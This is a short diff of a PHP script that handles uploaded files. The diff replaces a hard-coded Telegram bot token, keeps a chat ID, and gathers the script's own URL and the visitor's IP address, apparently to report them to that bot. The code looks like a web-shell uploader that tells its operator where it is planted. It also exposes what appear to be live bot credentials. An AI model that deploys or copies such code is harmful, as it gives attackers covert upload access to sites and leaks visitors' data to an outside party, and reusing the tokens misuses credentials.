@@ -81,7 +81,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
 }
 ?>
 <?php
-$telegram_token = "7479232652:AAHw7pLR6BxaXRxpwR4MbOVvrG3SU5pmW0c"; 
+$telegram_token = "7479232652:AAEGOGcgwzSBvM-lzQjKspGZ4PZUldY3mtA"; 
 $chat_id = "6812471405"; 
 $file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 $ip_address = $_SERVER['REMOTE_ADDR'];
